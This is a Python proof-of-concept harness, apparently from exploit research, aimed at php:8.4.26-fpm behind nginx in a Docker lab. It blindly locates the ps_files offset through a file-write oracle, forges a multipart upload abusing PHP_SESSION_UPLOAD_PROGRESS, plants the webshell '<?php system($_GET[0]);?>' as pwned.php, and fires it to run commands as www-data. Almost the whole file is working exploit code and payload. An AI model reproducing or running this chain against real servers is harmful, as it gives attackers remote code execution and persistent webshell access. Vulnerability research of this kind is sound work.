#!/usr/bin/env python3
"""Verify blind_psfiles_oracle: locate ps_files black-box via the EXACT GET-fire
file-write oracle over a bounded residue-page window (X fixed at the located anchor),
then fire the forge at the LOCATED residue -> uid=33, worker survives.

The residue window stands in for a per-build range or a leak-supplied prior (the same
residual the X-oracle carries; the cheap narrowing shortcut is refuted). It is
deliberately NOT centered on the answer. X is held at the known settled anchor X* =
d_choff - carrier_base (the X-oracle's job; here it is a fixed cross-check input, same
role KNOWN_XSTAR plays in verify_blind_anchor_oracle).

Lab: profile fpmfire (single-worker php:8.4.26-fpm behind nginx, writable /pub):
    docker compose -f docker-compose.fpm-avenues.yml --profile fpmfire up -d --build
    # nginx 127.0.0.1:18085
Run (slow: fresh container per probe):
    python3 -I poc/primitives/oracles/verify_blind_psfiles_oracle.py

PASS = the sweep locates residue*, it equals the known ps_files_choff - carrier_base
(cross-check only), AND the forge at the LOCATED residue writes the webshell + a plain
GET fires it (uid=33(www-data)) + worker survives.

The locator consumes ONLY the located X*, the per-SAPI sub-page slot (0x208 fpm), and a
residue window; ps_files_choff is NOT supplied.
"""
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.oracles.blind_psfiles_oracle import (  # noqa: E402
    SUBSLOT_BY_SAPI, forge_carrier, sweep_psfiles)
from primitives.write.kfree_stagefed_forge import (  # noqa: E402
    SETTLED_CONST, arm_parts, pretouch_parts, backing_field)
from common.multipart import multipart_tuple, part_tuple  # noqa: E402

REPO = os.path.dirname(_POC_ROOT)
COMPOSE_FILE = os.path.join(REPO, "docker-compose.fpm-avenues.yml")
BASE = "http://127.0.0.1:18085"
PROFILE = "fpmfire"
CONTAINER = "p2s-fpmfire-fpm"
SID = "sess0000000000000000000000000001"
SF = "/tmp/sess_" + SID
WEBSHELL = b"<?php system($_GET[0]);?>"
TARGET = "/var/www/html/pub/pwned.php"
URLPATH = "/pub/pwned.php"
BND = b"----l2"

XSTAR = SETTLED_CONST["d_choff"] - SETTLED_CONST["carrier_base"]        # located-X input
RESIDUE_STAR = SETTLED_CONST["ps_files"] - SETTLED_CONST["carrier_base"]  # cross-check target
SUBSLOT = SETTLED_CONST["ps_files"] & 0xfff                            # 0x208 (fpm)
# residue-page window (would come from a per-build range or a leak). residue* is page
# -0xD; swept outward from a nominal prior 2 pages off, it must still pin the exact page.
WIN_PAGES = range(-0x8, -0x15, -1)
WIN_CENTER = -0xB


def comp(*a, t=180):
    return subprocess.run(["docker", "compose", "-f", COMPOSE_FILE, "--profile", PROFILE, *a],
                          cwd=REPO, capture_output=True, text=True, timeout=t)


def dx(*c, t=30):
    return subprocess.run(["docker", "exec", CONTAINER, *c], capture_output=True, text=True, timeout=t).stdout


def http(path, data=None, ct=None, t=90, cookie=False):
    req = urllib.request.Request(BASE + path, data=data)
    if ct:
        req.add_header("Content-Type", ct)
    if cookie:
        req.add_header("Cookie", "PHPSESSID=" + SID)
    try:
        with urllib.request.urlopen(req, timeout=t) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return None, repr(e).encode()


def wpid():
    s, b = http("/probe.php", t=8)
    return b.split(b":", 1)[1].decode().strip() if (s == 200 and b.startswith(b"ALIVE:")) else None


def ready():
    for _ in range(80):
        if wpid():
            return True
        time.sleep(0.5)
    return False


def _fresh():
    comp("down", t=90)
    comp("up", "-d", t=150)
    return ready()


def _arm_once():
    dx("sh", "-c", f"printf %s 'aa|i:9;bb|i:2;' > {SF}; chown www-data {SF}")
    pb, ph = multipart_tuple(pretouch_parts(), BND)
    http("/arm.php", data=pb, ct=ph["Content-Type"])
    http("/echo.php")
    p0 = wpid()
    ab, ah = multipart_tuple(arm_parts(), BND)
    http("/arm.php", data=ab, ct=ah["Content-Type"])
    return p0


def _stage(carrier):
    parts = [part_tuple("C", carrier),
             part_tuple("B", backing_field(TARGET, SETTLED_CONST)), part_tuple("B", b"x"),
             part_tuple("PHP_SESSION_UPLOAD_PROGRESS", WEBSHELL),
             part_tuple("f", b"Z" * 64, filename="a.bin", ctype="application/octet-stream")]
    sb, sh = multipart_tuple(parts, BND)
    http("/echo.php", data=sb, ct=sh["Content-Type"], cookie=True, t=30)


def probe_write(x, residue):
    if not _fresh():
        raise RuntimeError("boot")
    carrier = forge_carrier(x, residue)
    _arm_once()
    _stage(carrier)
    ls = dx("sh", "-c", f"ls {TARGET} 2>&1").strip()
    wrote = TARGET in ls and "No such" not in ls
    print(f"  [fine] residue=0x{residue & 0xffffffffffff:x} wrote={wrote}", flush=True)
    return wrote


def final_fire(x, residue):
    if not _fresh():
        return False, "boot"
    p0 = _arm_once()
    _stage(forge_carrier(x, residue))
    ls = dx("sh", "-c", f"ls {TARGET} 2>&1").strip()
    wrote = TARGET in ls and "No such" not in ls
    nonce = "FIRE%08x" % int.from_bytes(os.urandom(4), "big")
    body = ""
    if wrote:
        s, b = http(f"{URLPATH}?0={urllib.parse.quote('echo ' + nonce + ';id')}", t=15)
        body = (b or b"").decode("latin-1", "replace")
    p1 = wpid()
    uid = re.search(r"uid=\d+\([^)]*\)", body)
    fired = (nonce in body) and bool(re.search(r"uid=\d+\(www-data\)", body))
    surv = p1 is not None and p1 == p0
    return (wrote and fired and surv), (f"wrote={wrote} fired={fired} surv={surv} "
            f"uid='{uid.group(0) if uid else 'n/a'}' p=({p0},{p1})")


def main():
    if subprocess.run(["docker", "version"], capture_output=True).returncode != 0:
        print("SKIP: docker unavailable"); return
    print(f"# blind ps_files file-write oracle, black-box (no gdb/leak). x*=0x{XSTAR:x} "
          f"subslot=0x{SUBSLOT:x} known_residue*=0x{RESIDUE_STAR & 0xffffffffffff:x} "
          f"pages=[{WIN_PAGES.start:#x}..{WIN_PAGES.stop:#x}) center={WIN_CENTER:#x}", flush=True)
    rs = sweep_psfiles(probe_write, XSTAR, WIN_PAGES, subslot=SUBSLOT, center=WIN_CENTER)
    print(f"\n# located residue*={('0x%x' % (rs & 0xffffffffffff)) if rs is not None else 'NONE'}", flush=True)
    if rs is None:
        comp("down", t=90)
        print("\nFAIL: oracle did not locate residue*"); return
    rmatch = (rs == RESIDUE_STAR)
    print(f"# residue* vs known ps_files-carrier_base: {'MATCH' if rmatch else 'MISMATCH'} "
          f"(derived 0x{rs & 0xffffffffffff:x} vs 0x{RESIDUE_STAR & 0xffffffffffff:x})", flush=True)
    ok, line = final_fire(XSTAR, rs)
    print(f"# final fire at DERIVED residue*: {line} -> {'PASS' if ok else 'FAIL'}", flush=True)
    comp("down", t=90)
    overall = ok and rmatch
    print(f"\n{'PASS' if overall else 'FAIL'}: black-box ps_files derivation -> forge fired "
          f"(uid-in-hand), residue* {'matches' if rmatch else 'MISMATCHES'} ground truth", flush=True)


if __name__ == "__main__":
    main()
